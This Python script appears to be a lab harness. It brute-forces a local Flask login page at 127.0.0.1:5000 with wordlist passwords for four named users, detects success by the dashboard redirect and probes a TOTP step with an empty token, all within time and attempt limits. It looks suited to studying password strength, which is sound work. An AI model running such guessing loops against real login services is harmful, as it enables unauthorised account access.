from util import users_list, generate_sequences, get_secret_key
import requests, time, yaml, random

with open("config.yaml", "r") as f:
    config = yaml.safe_load(f)
PASS_LEVEL = config["config"]["pass_level"]

LOGIN_URL = "http://127.0.0.1:5000/login"
LOGIN_TOTP_URL = "http://127.0.0.1:5000/login_totp"
MAX_DURATION = 7200 #this is two hours
MAX_ATTEMPTS = 300000

USERS = random.sample(users_list(PASS_LEVEL), 4)
print(USERS)

PASS_FILE = f"passwords/{PASS_LEVEL}pass.txt"


USERS = [ "moriya", "tina", "david", "georgia"]


start = time.perf_counter()
for user in USERS:
    if PASS_LEVEL != "weak":
        generate_sequences(PASS_LEVEL, PASS_FILE, user, 5)
    with open(PASS_FILE, "r") as f:
        for attempt_num, password in enumerate(f, start=1):
            password = password.strip()
            elapsed_time = time.perf_counter() - start
            if attempt_num > MAX_ATTEMPTS:
                print("next user")
                pass
            if elapsed_time < MAX_DURATION:
                response = requests.post(
                    LOGIN_URL,
                    data={
                        "username": user,
                        "password": password
                    }
                )
                success, code_resp = "/dashboard" in response.url, response.status_code

                if success:
                    break

                if code_resp == 500: #If TOTP is required.
                    totp_response = requests.post(
                        LOGIN_TOTP_URL,  # TOTP verification URL
                        data={
                            "TOTP_token": ""
                        },
                        cookies=response.cookies  #Retain session (cookies) to maintain state
                    )
                    #Log the failure (simulating a TOTP fail)
                    if totp_response.status_code == 501:
                        print(f"TOTP fail for user {user} with password {password}")
                    
                    break 
            
            else:
                print(f"Time limit reached ({elapsed_time:.2f}s)Shutting down.")
                break
            time.sleep(0.05)